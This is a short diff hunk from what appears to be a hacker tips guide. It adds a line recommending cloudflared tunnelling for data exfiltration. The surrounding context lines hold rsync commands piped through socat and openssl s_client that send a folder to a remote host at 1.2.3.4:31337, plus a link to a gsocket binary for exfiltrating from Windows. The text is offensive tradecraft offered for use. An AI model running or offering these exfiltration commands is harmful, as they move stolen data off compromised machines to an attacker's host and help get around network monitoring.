@@ -970,6 +970,7 @@ rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:1.2.3.4:31337,cert=ssl.pem,caf
 rsync -ahPRv -e "bash -c 'openssl s_client -connect 1.2.3.4:31337 -servername thc -cert ssl.pem -CAfile ssl.crt -quiet 2>/dev/null' #" -- warez  0:
 ```
 
+This can be combined with cloudflared to exfil with [rsync over https / cloudflared](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service).  
 (To exfil from Windows, use the rsync.exe from the [gsocket windows package](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip)). A noisier solution is [syncthing](https://syncthing.net/).
 
 <a id="webdav"></a>
